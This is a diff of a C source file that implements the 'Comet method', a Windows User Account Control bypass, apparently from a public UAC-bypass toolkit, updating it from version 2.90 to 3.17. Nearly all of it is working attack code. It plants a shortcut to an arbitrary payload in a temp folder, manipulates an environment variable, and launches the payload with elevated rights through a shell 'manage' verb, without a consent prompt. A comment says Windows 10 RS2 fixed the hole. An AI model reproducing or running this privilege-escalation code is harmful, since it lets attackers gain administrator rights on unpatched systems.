@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2018
+*  (C) COPYRIGHT AUTHORS, 2016 - 2019
 *
 *  TITLE:       COMET.C
 *
-*  VERSION:     2.90
+*  VERSION:     3.17
 *
-*  DATE:        16 July 2018
+*  DATE:        18 Mar 2019
 *
 *  Comet method (c) BreakingMalware
 *  For description please visit original URL 
@@ -34,7 +34,7 @@
 * Fixed in Windows 10 RS2
 *
 */
-BOOL ucmCometMethod(
+NTSTATUS ucmCometMethod(
     _In_ LPWSTR lpszPayload
 )
 {
@@ -42,9 +42,16 @@ BOOL ucmCometMethod(
     PVOID   OldValue = NULL;
 #endif
 
-    BOOL    bCond = FALSE, bResult = FALSE;
+    HRESULT hr_init;
+
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
+#ifndef _WIN64
+    NTSTATUS Status;
+#endif
+
+    BOOL    bCond = FALSE;
     WCHAR   szCombinedPath[MAX_PATH * 2], szLinkFile[MAX_PATH * 3];
-    HRESULT hResult;
 
     IPersistFile    *persistFile = NULL;
     IShellLink      *newLink = NULL;
@@ -52,16 +59,17 @@ BOOL ucmCometMethod(
     SHELLEXECUTEINFO  shinfo;
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
-        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
-            return FALSE;
+    if (g_ctx->IsWow64) {
+        Status = RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue);
+        if (!NT_SUCCESS(Status))
+            return Status;
     }
 #endif
 
     do {
 
         RtlSecureZeroMemory(szCombinedPath, sizeof(szCombinedPath));
-        _strcpy(szCombinedPath, g_ctx.szTempDirectory);
+        _strcpy(szCombinedPath, g_ctx->szTempDirectory);
         _strcat(szCombinedPath, SOMEOTHERNAME);
         if (!CreateDirectory(szCombinedPath, NULL)) {//%temp%\Comet
             if (GetLastError() != ERROR_ALREADY_EXISTS)
@@ -108,51 +116,50 @@ BOOL ucmCometMethod(
                 break;
         }
 
-        hResult = CoInitialize(NULL);
-        if (SUCCEEDED(hResult)) {
-            hResult = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID *)&newLink);
-            if (SUCCEEDED(hResult)) {
-                newLink->lpVtbl->SetPath(newLink, lpszPayload);
-                newLink->lpVtbl->SetArguments(newLink, L"");
-                newLink->lpVtbl->SetDescription(newLink, L"Comet method");
-                hResult = newLink->lpVtbl->QueryInterface(newLink, &IID_IPersistFile, (void **)&persistFile);
-                if (SUCCEEDED(hResult)) {
+        hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+        if (SUCCEEDED(CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID *)&newLink))) {
+            newLink->lpVtbl->SetPath(newLink, lpszPayload);
+            newLink->lpVtbl->SetArguments(newLink, L"");
+            newLink->lpVtbl->SetDescription(newLink, L"Comet method");
+            if (SUCCEEDED(newLink->lpVtbl->QueryInterface(newLink, &IID_IPersistFile, (void **)&persistFile))) {
+                _strcpy(szLinkFile, szCombinedPath);
+                _strcat(szLinkFile, L"\\Computer Management.lnk");
+                if (SUCCEEDED(persistFile->lpVtbl->Save(persistFile, szLinkFile, TRUE))) {
+                    persistFile->lpVtbl->Release(persistFile);
+
+                    _strcpy(szCombinedPath, g_ctx->szTempDirectory);
+                    _strcat(szCombinedPath, SOMEOTHERNAME);
                     _strcpy(szLinkFile, szCombinedPath);
-                    _strcat(szLinkFile, L"\\Computer Management.lnk");
-                    if (SUCCEEDED(persistFile->lpVtbl->Save(persistFile, szLinkFile, TRUE))) {
-                        persistFile->lpVtbl->Release(persistFile);
+                    _strcat(szLinkFile, T_CLSID_MYCOMPUTER_COMET);
 
-                        _strcpy(szCombinedPath, g_ctx.szTempDirectory);
-                        _strcat(szCombinedPath, SOMEOTHERNAME);
-                        _strcpy(szLinkFile, szCombinedPath);
-                        _strcat(szLinkFile, T_CLSID_MYCOMPUTER_COMET);
-
-                        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
-                        shinfo.cbSize = sizeof(shinfo);
-                        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
-                        shinfo.lpFile = szLinkFile;
-                        shinfo.lpParameters = L"";
-                        shinfo.lpVerb = MANAGE_VERB;
-                        shinfo.lpDirectory = szCombinedPath;
-                        shinfo.nShow = SW_SHOW;
-                        if (ShellExecuteEx(&shinfo)) {
-                            CloseHandle(shinfo.hProcess);
-                            bResult = TRUE;
-                        }
+                    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+                    shinfo.cbSize = sizeof(shinfo);
+                    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+                    shinfo.lpFile = szLinkFile;
+                    shinfo.lpParameters = L"";
+                    shinfo.lpVerb = MANAGE_VERB;
+                    shinfo.lpDirectory = szCombinedPath;
+                    shinfo.nShow = SW_SHOW;
+                    if (ShellExecuteEx(&shinfo)) {
+                        CloseHandle(shinfo.hProcess);
+                        MethodResult = STATUS_SUCCESS;
                     }
                 }
-                newLink->lpVtbl->Release(newLink);
             }
+            newLink->lpVtbl->Release(newLink);
         }
+
+        if (hr_init == S_OK)
+            CoUninitialize();
 
     } while (bCond);
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
     }
 #endif
 
     supSetEnvVariable(TRUE, NULL, T_PROGRAMDATA, NULL);
-    return bResult;
+    return MethodResult;
 }
